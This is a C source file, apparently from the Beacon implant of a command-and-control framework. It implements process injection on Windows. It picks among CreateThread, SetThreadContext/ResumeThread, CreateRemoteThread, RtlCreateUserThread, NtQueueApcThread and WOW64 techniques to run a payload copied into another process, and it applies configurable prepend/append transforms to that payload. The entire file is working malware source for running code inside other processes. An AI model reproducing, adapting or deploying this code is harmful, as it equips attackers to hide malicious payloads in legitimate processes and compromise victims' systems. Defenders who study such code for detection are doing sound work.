/*
 * Process Injection with Asynchronous Procedure Call Queue attached to Windows
 * Threads. Taken from Meterpreter.
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "inject.h"
#include "tokens.h"
#include "functions.h"
#include "bformat.h"

BOOL inject_process_execute(INJECTCONTEXT * context, char * ptr, int offset, void * parameter) {
	char *          options = setting_ptr(SETTING_PROCINJ_EXECUTE);
	datap           parser;
	DWORD           opcode;
	char *          module;
	char *          function;
	DWORD           funcoff;

	/* 128 is the FIXED size of this field */
	data_init(&parser, options, 128);

	/* walk our options */
	while (TRUE) {
		opcode = data_byte(&parser);

		switch (opcode) {
			/* automatic failure, because we're at the end of our options */
			case PI_EXEC_FAIL:
				return FALSE;

			/* try to use CreateThread (works current process inject only */
			case PI_EXEC_CREATETHREAD:
				if (context->samePid && inject_via_createthread(context->hProcess, context->pid, ptr + offset, parameter))
					return TRUE;
				break;

			/* try to use SetThreadContext/ResumeThread to execute our stuff */
			case PI_EXEC_SETTHREADCONTEXT:
				if (context->isSuspended && inject_via_resumethread(context, (char *)ptr + offset, parameter))
					return TRUE;
				break;

#if defined _M_X64
			/* try to use CreateRemoteThread */
			case PI_EXEC_CREATEREMOTETHREAD:
				if (inject_via_remotethread(context->hProcess, (char *)ptr + offset, parameter))
					return TRUE;
				break;

			/* try to use RtlCreateUserThread */
			case PI_EXEC_RTLCREATEUSERTHREAD:
				if (inject_via_createuserthread(context->hProcess, (char *)ptr + offset, parameter))
					return TRUE;
				break;

#elif defined _M_IX86
			/* try to use CreateRemoteThread */
			case PI_EXEC_CREATEREMOTETHREAD:
				if (context->sameArch && inject_via_remotethread(context->hProcess, (char *)ptr + offset, parameter))
					return TRUE;
				break;

			/* try to use RtlCreateUserThread */
			case PI_EXEC_RTLCREATEUSERTHREAD:
				if (!context->sameArch && inject_via_remotethread_wow64(context->hProcess, (char *)ptr + offset, parameter))
					return TRUE;
				else if (context->sameArch && inject_via_createuserthread(context->hProcess, (char *)ptr + offset, parameter))
					return TRUE;
				break;
#endif

			/* try NtQueueApcThread against a remote process that is not suspended */
			case PI_EXEC_NTQUEUEAPCTHREAD:
				if (context->samePid || !context->sameArch || context->isSuspended)
					break;
				else if (inject_via_apcthread(context, (char *)ptr + offset, parameter))
					return TRUE;
				break;

			/* CreateThread with hint */
			case PI_EXEC_CREATETHREAD_F:
				funcoff  = data_short(&parser);
				module   = data_string_asciiz(&parser);
				function = data_string_asciiz(&parser);

				if (context->samePid && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
					return TRUE;
				break;

			/* CreateRemoteThread with hint */
			case PI_EXEC_CREATEREMOTETHREAD_F:
				funcoff  = data_short(&parser);
				module   = data_string_asciiz(&parser);
				function = data_string_asciiz(&parser);

				if (context->sameArch && inject_with_hinted_func(opcode, context->hProcess, (char *)ptr + offset, parameter, module, function, funcoff))
					return TRUE;
				break;

			/* try NtQueueApcThread against a suspended process */
			case PI_EXEC_NTQUEUEAPCTHREAD_S:
				if (context->isSuspended && context->sameArch && inject_via_apcthread_targeted(context, (char *)ptr + offset, parameter))
					return TRUE;
				break;
		}
	}

	return FALSE;
}

/*
* This function is the master tree for Beacon's process injection logic. It's a little ugly, but thought out. Here's what the parameters mean:
*
*     PROCESS_INFORMATION * pi
*         This is the process information block for a spawned process. Specify NULL if this is not a spawned process eligible for hollowing techniques
*     HANDLE hProcess
*         A handle to the remote process we want to inject into
*     DWORD pid
*         The process Id of the remote PID because it's too hard (j/k) to figure this out myself
*     char * buffer
*         The data we want to inject into the remote process (assume this will live in RX pages in the remote process)
*         This data *will* always be mirrored to make sure assumptions about page permissions and buffer availability hold.
*     int length
*         The length of the buffer we're going to mirror in the remote process
*     int offset
*         The location of the function we should call inside of the data we mirrored in the remote process
*     void * parameter
*         A pointer to a remote data blob (I assume you mirrored it!) to pass as a parameter to the function we call.
*/
void __inject_process_logic(INJECTCONTEXT * context, char * buffer, int length, int offset, void * parameter) {
	void * ptr;

	/* mirror the data */
	if (context->samePid) {
		ptr = local_mirror_data(buffer, length);
	}
	else {
		ptr = remote_mirror_data(context, buffer, length);
	}

	if (ptr == NULL)
		return;

	/* call our logic to execute code */
	if (inject_process_execute(context, (char *)ptr, offset, parameter))
		return; /* TODO: what happens to ptr? From what I can see the allocated memory is lost as well as the handle to the thread. local - uses VirtualAlloc remote - uses VirtualAlloc or NTMAPVIEWOFSECTION */

	/* post an error staging PI failed... not 0x20 though */
	post_error_dd(0x48, context->pid, GetLastError());
}

/* populate an inject context object. This exists because several places in the inject code figure out these same
   questions (again and again), sometimes with different ways of doing it. As that's a risk for bugs, this is a way
   of forcing these calculations to happen once and in one place. */
void populate_inject_context(INJECTCONTEXT * context, PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid) {
	context->hProcess    = hProcess;
	context->pid         = pid;
	context->myArch      = is_x64() ? INJECT_ARCH_X64 : INJECT_ARCH_X86;
	context->targetArch  = is_x64_process(hProcess) ? INJECT_ARCH_X64 : INJECT_ARCH_X86;
	context->sameArch    = context->targetArch == context->myArch;
	context->samePid     = pid == GetCurrentProcessId();

	if (pi != NULL) {
		context->isSuspended = TRUE;
		context->hThread     = pi->hThread;
	}
	else {
		context->isSuspended = FALSE;
		context->hThread     = NULL;
	}
}

/* handle our transforms on buffer */
void inject_process_logic(PROCESS_INFORMATION * pi, HANDLE hProcess, DWORD pid, char * buffer, int length, int offset, void * parameter, int plen) {
	datap         parser;
	DWORD         prependl;
	DWORD         appendl;
	char *        prepend;
	char *        append;
	char *        rparameter;
	formatp       tbuffer;
	int           field = 0;
	INJECTCONTEXT context;

	/* populate our context to avoid the need for other functions to figure out the same crap */
	populate_inject_context(&context, pi, hProcess, pid);

	/* if we're a smart inject DLL, act on it */
	SetupSmartInject(&context, buffer, length);

	/* figure out which transform we want to apply. I know this is ugly */
	if (context.targetArch == INJECT_ARCH_X64)
		field = SETTING_PROCINJ_TRANSFORM_X64;
	else
		field = SETTING_PROCINJ_TRANSFORM_X86;

	/* alrighty, let's get these values */
	data_init(&parser, setting_ptr(field), 256);
	prependl = data_int(&parser);
	prepend = data_ptr(&parser, prependl);
	appendl = data_int(&parser);
	append = data_ptr(&parser, appendl);

	/* handle copying our parameter to the remote process, please */
	if (plen > 0)
		rparameter = remote_mirror_data(&context, (char *)parameter, plen);
	else
		rparameter = NULL;

	/* easiest case, nothing needs to happen. Pass the data on as needed */
	if (prependl == 0 && appendl == 0) {
		__inject_process_logic(&context, buffer, length, offset, rparameter);
		return;
	}

	/* okie, let's setup our builder and get this moving */
	bformat_init(&tbuffer, appendl + prependl + length + 16);
	bformat_copy(&tbuffer, prepend, prependl);
	bformat_copy(&tbuffer, buffer, length);
	bformat_copy(&tbuffer, append, appendl);
	offset += prependl;

	/* kick off our process inject call */
	__inject_process_logic(&context, bformat_string(&tbuffer), bformat_length(&tbuffer), offset, rparameter);

	/* free everything */
	bformat_free(&tbuffer);
}